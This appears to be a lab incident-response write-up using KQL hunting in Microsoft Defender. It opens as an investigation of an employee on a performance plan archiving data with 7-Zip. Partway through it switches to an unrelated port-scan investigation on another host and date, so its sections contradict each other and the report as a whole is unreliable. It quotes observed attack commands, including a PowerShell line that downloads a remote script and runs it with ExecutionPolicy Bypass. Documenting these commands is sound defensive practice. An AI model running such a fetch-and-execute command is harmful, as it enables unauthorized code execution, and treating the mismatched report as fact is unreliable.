

# Suspicious Data Archiving on Corporate Device
# Objective:
Identify any suspicious process executions, file archival activity, and associated network traffic surrounding critical timestamps.

---
# Tools & Technology:
- Azure Virtual Machine
- PowerShell 
- Microsoft Defender
- KQL Query

---
# Table of contents

- [1. Summary](#1-summary)
- [2. Preparation](#2-preparation)
- [3. Data Collection](#3-data-collection)
- [4. Data Analysis](#4-data-analysis)
- [5. Investigation](#5-investigation)
- [6. Response](#6-response)
- [7. MITRE ATT&CK Mapping](#7-mitre-attck-mapping)
- [8. Lessons Learned / Improvement:](#8-lessons-learned--improvement)
- [9. Final Status](#9-final-status)
---


## 🛡️ Incident Report: Internal Port Scanning Activity on 10.0.0.0/16 Network
## 1. Summary
Title: Suspected Data Exfiltration Attempt by PIP'd Employee
Target: John Doe Smith (Employee under Performance Improvement Plan)
Device Investigated: vmlab-fe
Investigator: Fe Esguerra
Date: June 21, 2025
Tool Used: Microsoft Defender for Endpoint (MDE)

## 2. Preparation
### Goal:
Assess potential insider threat activities by John Doe Smith, who recently exhibited behavioral concerns and may attempt to exfiltrate sensitive company data prior to resigning or termination.

### Hypothesis:
Due to John's administrative privileges and emotional response to being placed on a PIP, we hypothesize he may attempt to compress and transfer sensitive files outside the organization using custom or common archive tools (e.g., 7-Zip).

## 3. Data Collection
### Data Sources Queried:

#### DeviceFileEvents 

![DataCollection1](https://github.com/user-attachments/assets/9e98c6f6-d8be-4362-9a4b-e8733b634626)


## 4. Data Analysis

### Focus Areas:

- Queried .zip file creation events:
```kql
DeviceFileEvents
| where DeviceName == "vmlab-fe"
| where FileName endswith ".zip"
| order by Timestamp desc


```
![DataCollection2](https://github.com/user-attachments/assets/838c31ec-c5f6-49b3-ba03-d675e1163c26)
  
- Identified a recurring pattern of archives being created and saved in a "backup" folder.

- Timestamp of a notable archive creation: 2025-06-21T04:53:44.4622833Z

- Analyzed process activity ±2 minutes around that timestamp:

```kql
let VMName = "vmlab-fe";
let specificTime = datetime(2025-06-21T04:53:44.4622833Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc
```


![DataCollection3](https://github.com/user-attachments/assets/d1fdc9d4-b9ed-4bd3-97f7-55de23d7bcab)

### Findings:

- A PowerShell script silently installed 7-Zip.
- The script then used 7z.exe to archive employee data.
- Example of the command observed:


```python
powershell.exe -ExecutionPolicy Bypass -Command "...Install 7zip..."
7z.exe a -tzip archive.zip EmployeeData\

```

![DataCollection5](https://github.com/user-attachments/assets/ff02c0fe-f7d6-43ec-80aa-10c50c3c9380)



## 5. Investigation

Pivoted to DeviceProcessEvents for host windows-target-1 and timestamp near suspicious activity:

```kql
let VMName = "windows-target-1";
let specificTime = datetime(2025-06-10T08:41:10.2458249Z);
DeviceProcessEvents
| where Timestamp between ((specificTime - 10m) .. (specificTime + 10m))
| where DeviceName == VMName
| where InitiatingProcessCommandLine contains "portscan"
| order by Timestamp desc
| project Timestamp, FileName, InitiatingProcessCommandLine, AccountName

```
![DeviceProcessEvents](https://github.com/user-attachments/assets/42402a97-5812-4ae5-9230-e88689618cbc)

Account:
Executed by SYSTEM — not expected behavior; not triggered by any admin.

Key Finding:
A PowerShell command was executed at 2025-06-10T08:37:51Z with the following line:

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1' -OutFile 'C:\programdata\portscan.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1

```

I logged into the suspect computer and observed the powershell script that was used to conduct the port scan:

![portscan](https://github.com/user-attachments/assets/ba71f03c-5e53-4fab-bf31-743708f8d6d2)


## 6. Response
### Actions Taken:

- Logged into the device to verify script existence. 
- Confirmed the file portscan.ps1 existed under C:\ProgramData. 
- Isolated the host from the network. 
- Performed a full malware scan (no malware detected). 
- Escalated to IT for reimaging of the device to ensure integrity. 

## 7. MITRE ATT&CK Mapping

- T1046 - Network Service Discovery  
  (Port scanning activity to identify open services)

- T1059.001 - Command and Scripting Interpreter: PowerShell  
  (Execution of PowerShell script to perform scan)

- T1078 - Valid Accounts  
  (Script executed under SYSTEM account)

- T1105 - Ingress Tool Transfer  
  (Script downloaded from external URL using Invoke-WebRequest)

- T1204.002 - User Execution: Malicious File  
  (Execution of suspicious PowerShell file)

- T1562.001 - Impair Defenses (if applicable)  
  (Not confirmed, but would apply if local defenses were bypassed or modified)

## 8. Lessons Learned / Improvement: 

Review PowerShell execution policies and endpoint monitoring rules

## 9. Final Status

Threat Contained: ✅

Device Isolated: ✅

Malware Scan Result: Clean

Device Action: Ticket submitted for full rebuild




